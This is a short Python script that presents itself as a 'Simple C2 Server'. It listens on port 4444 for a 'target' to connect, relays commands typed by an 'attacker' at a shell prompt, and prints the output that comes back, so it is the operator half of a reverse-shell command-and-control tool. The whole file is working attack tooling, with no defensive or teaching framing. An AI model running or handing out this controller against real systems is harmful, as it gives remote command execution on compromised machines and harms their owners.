#!/usr/bin/env python3
import socket
import sys
import threading
import os

def handle_client(client_socket):
    """Handle connected client commands"""
    try:
        while True:
            # Get command from attacker
            cmd = input("shell> ")
            if cmd.lower() == 'exit':
                client_socket.send(b'exit')
                break
            elif cmd.lower() == 'terminate':
                client_socket.send(b'terminate')
                break
            
            # Send command to client
            client_socket.send(cmd.encode())
            
            # Receive output
            response = client_socket.recv(4096).decode()
            print(response)
    except:
        print("[!] Connection lost")
    finally:
        client_socket.close()

def start_server(port):
    """Start listening for connections"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(('0.0.0.0', port))
        server.listen(1)
        print(f"[*] Listening on port {port}")
        print("[*] Waiting for target connection...")
        
        client, addr = server.accept()
        print(f"[+] Connection from {addr}")
        
        handle_client(client)
        
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        server.close()

if __name__ == '__main__':
    port = 4444  # You can change this
    print("=== Simple C2 Server ===")
    print("Commands: [any system command], 'exit' (close session), 'terminate' (kill client)")
    start_server(port)